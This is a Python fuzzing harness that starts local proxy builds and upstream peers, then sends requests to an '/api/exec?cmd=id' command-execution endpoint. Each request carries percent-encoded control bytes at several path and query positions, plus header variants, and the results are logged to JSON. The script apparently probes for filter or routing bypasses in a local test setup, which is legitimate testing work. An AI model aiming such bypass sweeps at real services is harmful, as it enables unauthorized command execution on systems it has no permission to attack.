#!/usr/bin/env python3
import subprocess, socket, sys, time, os, json, binascii
ROOT = "/home/mouse9911/gits/toksec/temp/rce-sweep2"
BASE = 51000
def fp():
    used = set()
    while True:
        p = 51000 + int(time.time() * 1000) % 1000
        if p in used:
            p += 1
            if p > 51999:
                p = 51000
        if p in used:
            continue
        s = socket.socket()
        try:
            s.bind(("127.0.0.1", p)); s.close(); used.add(p); return p
        except OSError:
            s.close()
BUILDS = [
    ("1cfd33433d25__61cc738c", "nginx"),
    ("3aeb255d3d7f__6fb186ed", "nginx"),
    ("3aeb255d3d7f__8d5ff1f2", "nginx"),
    ("3aeb255d3d7f__ae021893", "kv"),
    ("1cfd33433d25__6baf167b", "kv"),
    ("1cfd33433d25__e1a28e35", "kv"),
    ("3aeb255d3d7f__29d05850", "nginx"),
    ("1cfd33433d25__063b0d5e", "nginx"),
    ("1cfd33433d25__44bf7f35", "nginx"),
    ("3aeb255d3d7f__f2b3415b", "kv"),
    ("1cfd33433d25__afdc173f", "kv"),
    ("2usd", "nginx"),
]
def wait_port(p):
    for _ in range(100):
        time.sleep(0.05)
        try:
            socket.create_connection(("127.0.0.1", p), timeout=1).close()
            return True
        except OSError:
            continue
    return False
def sweep(build, dialect, up, out):
    listen = fp()
    cfg = "/tmp/r13_D_%s.conf" % build
    subprocess.run([sys.executable, "ev_r13_D_cfg.py", dialect, str(listen), str(up), cfg], cwd=ROOT, check=True)
    binp = "bin/r12_W_2usd" if build == "2usd" else "bin/" + build
    def one(tag, target):
        f = "/tmp/r13_D_%s_%s.txt" % (build, tag)
        p = subprocess.Popen(["timeout", "10s", binp, "--config", cfg], cwd=ROOT,
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        if not wait_port(listen):
            return b""
        try:
            subprocess.run([sys.executable, "ev_r13_D_client.py", str(listen), f, target, "1.6"], cwd=ROOT, check=True)
        except subprocess.CalledProcessError:
            pass
        txt = open(f).read()
        hexv = ""
        for ln in txt.splitlines():
            if ln.startswith("CLIENT_RECEIVED ") and len(ln.split()) > 1:
                hexv = ln.split()[1]
        return binascii.unhexlify(hexv) if hexv else b""
    ctl = one("ctl", "/api/exec?cmd=id")
    rows = []
    # byte, position: s=start, m=mid(before /exec), r=replace space, q=after ?, v=in query
    for b in list(range(1, 32)) + [127]:
        esc = "%%%02X" % b
        shapes = [
            ("s", "/api%s/exec?cmd=id" % esc),
            ("m", "/api/exec%s?cmd=id" % esc),
            ("r", "/api%%2f%%2fexec%s?cmd=id" % esc),
            ("q", "/api/exec?%scmd=id" % esc),
            ("v", "/api/exec?cmd=id%s" % esc),
        ]
        for pos, target in shapes:
            got = one("b%02x_%s" % (b, pos), target)
            rows.append({"byte": b, "pos": pos, "status": (got.split(b"\r\n", 1)[0].decode('latin1', 'replace') if got else ""),
                         "body": got.split(b"\r\n\r\n", 1)[-1].decode('latin1', 'replace') if got and b"\r\n\r\n" in got else ""})
    out.append({"build": build, "stage": "sweep", "ctl": ctl.decode('latin1', 'replace'), "rows": rows})
    time.sleep(0.1)
def header_sweep(build, up, out):
    listen = fp()
    cfg = "/tmp/r13_D_hf_%s.conf" % build
    subprocess.run([sys.executable, "ev_r13_D_cfg.py", "nginx", str(listen), str(up), cfg], cwd=ROOT, check=True)
    binp = "bin/" + build
    peer = subprocess.Popen([sys.executable, "ev_r13_D_peer.py", str(up), "hf", "/tmp/r13_D_hf_%s.log" % build, "10"], cwd=ROOT,
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(0.3)
    p = subprocess.Popen([binp, "--config", cfg], cwd=ROOT,
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    ok = wait_port(listen)
    if not ok:
        out.append({"build": build, "stage": "hf_start", "ok": False})
        p.terminate(); p.wait(); peer.terminate(); peer.wait(); return
    def one(tag):
        f = "/tmp/r13_D_hf_%s_%s.txt" % (build, tag)
        subprocess.run([sys.executable, "ev_r13_D_client.py", str(listen), f, "/api/exec?cmd=id", "1.6"], cwd=ROOT, check=True)
        txt = open(f).read()
        hexv = ""
        for ln in txt.splitlines():
            if ln.startswith("CLIENT_RECEIVED "):
                hexv = ln.split()[1]
        return binascii.unhexlify(hexv) if hexv else b""
    ctl = one("ctl")
    rows = []
    for name in ["h%02x" % b for b in list(range(1, 32)) + [127]]:
        got = one(name)
        rows.append({"mode": name, "raw": got.decode('latin1', 'replace')})
    out.append({"build": build, "stage": "hf", "ctl": ctl.decode('latin1', 'replace'), "rows": rows})
    try:
        p.wait(timeout=1)
    except subprocess.TimeoutExpired:
        p.terminate(); p.wait(timeout=2)
    peer.terminate(); peer.wait(); time.sleep(0.1)
def main():
    out = []
    up = fp()
    peer = subprocess.Popen([sys.executable, "ev_r13_D_peer.py", str(up), "exec", ROOT + "/ev_r13_D_peer_main.log", "3600"], cwd=ROOT,
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(0.4)
    for build, dialect in BUILDS:
        sweep(build, dialect, up, out)
        json.dump(out, open(ROOT + "/ev_r13_D_sweep.json", "w"), indent=1)
    for build in ["1cfd33433d25__61cc738c", "3aeb255d3d7f__8d5ff1f2", "1cfd33433d25__44bf7f35"]:
        header_sweep(build, up, out)
        json.dump(out, open(ROOT + "/ev_r13_D_sweep.json", "w"), indent=1)
    peer.terminate(); peer.wait()
    json.dump(out, open(ROOT + "/ev_r13_D_sweep.json", "w"), indent=1)
main()
